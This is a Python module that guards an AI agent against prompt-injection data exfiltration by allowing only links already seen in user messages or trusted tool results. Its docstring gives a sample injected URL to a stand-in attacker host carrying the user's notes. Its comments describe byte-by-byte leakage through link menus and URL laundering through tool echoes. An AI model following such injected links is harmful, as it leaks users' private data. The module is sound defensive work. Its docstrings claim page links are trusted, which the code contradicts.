"""Which links the assistant may open without asking (tilt_ui-eevz.10).

Prompt-injection defence: a hostile page or caption can tell the model to
open "https://attacker.example/?d=<your notes>". Opening a link sends data out
and needs no approval, so the agent may only open links that already appeared
in the user's messages or in earlier tool results (search results, links on
pages it read, its own earlier fetches). A link the model composed itself is
not in that set and goes to the user as an approval card instead.
"""

import json
import re
from typing import Any, Iterable
from urllib.parse import urlsplit

_URL = re.compile(r"""https?://[^\s"'<>\\`{}|^]+""", re.I)
_BARE = re.compile(r"""(?<![\w@/.-])(?:www\.)?[a-z0-9-]+(?:\.[a-z0-9-]+)+\.?[a-z]{2,}/[^\s"'<>\\`{}|^]*""", re.I)
_TRAILING = ".,;:!?)]}>"


def link_key(url: str) -> str | None:
    """Strict comparable form. Only scheme, a leading "www.", ONE trailing slash and the #fragment
    (never sent to the server) are ignored; everything else must match exactly, so no characters
    can be added to a known link to carry data (Gemini: trailing "?.,;", extra slashes, ports).
    """
    u = (url or "").strip()
    if not u or "\\" in u:
        return None
    try:
        parts = urlsplit(u if "://" in u else f"https://{u}")
        host = (parts.hostname or "").lower()
        port = parts.port
    except ValueError:
        return None
    if not host or parts.username is not None or parts.password is not None:
        return None
    host = host.removeprefix("www.")
    path = parts.path[:-1] if parts.path.endswith("/") else parts.path
    authority = host if port in (None, 80, 443) else f"{host}:{port}"
    return f"{authority}{path}" + (f"?{parts.query}" if parts.query or u.split("#")[0].endswith("?") else "")


def urls_in(text: str) -> set[str]:
    keys = set()
    for m in list(_URL.finditer(text)) + list(_BARE.finditer(text)):
        k = link_key(m.group(0).rstrip(_TRAILING))  # prose punctuation after a link is not part of it
        if k:
            keys.add(k)
    return keys


def _text(content: Any) -> str:
    if isinstance(content, str):
        return content
    try:
        return json.dumps(content, default=str)
    except (TypeError, ValueError):
        return str(content)


def _result_urls(tool_name: str, content: Any) -> list[str]:
    """Only URLs that came from the outside world, never fields that echo the model's input.

    web_search echoes the model's query and preview_recipe echoes the model's document, so whole
    tool results cannot be trusted: a model could launder a composed URL through them (codex P1).
    """
    if not isinstance(content, dict):
        return []
    if tool_name == "web_search":
        return [r.get("url") for r in content.get("results") or [] if isinstance(r, dict) and isinstance(r.get("url"), str)]
    if tool_name == "fetch_url" and not content.get("error"):
        # Only the page itself (to read its next part). Links listed ON a page are not trusted:
        # a hostile page could offer a menu of 256 links and have the model pick one per byte
        # of private data (Gemini). Following them asks the user.
        return [content["url"]] if isinstance(content.get("url"), str) else []
    return []


def known_links(messages: Iterable[Any]) -> set[str]:
    """Links from the user's messages, search results and links on pages read; never the model's own words."""
    from pydantic_ai.messages import ModelRequest, ToolReturnPart, UserPromptPart

    keys: set[str] = set()
    for message in messages or []:
        if not isinstance(message, ModelRequest):
            continue
        for part in message.parts:
            if isinstance(part, UserPromptPart):
                content = part.content
                if isinstance(content, (list, tuple)):
                    content = " ".join(c for c in content if isinstance(c, str))
                keys |= urls_in(_text(content))
            elif isinstance(part, ToolReturnPart):
                for url in _result_urls(part.tool_name, part.content):
                    k = link_key(url)
                    if k:
                        keys.add(k)
    return keys


def is_known(url: str, messages: Iterable[Any]) -> bool:
    k = link_key(url)
    return bool(k) and k in known_links(messages)
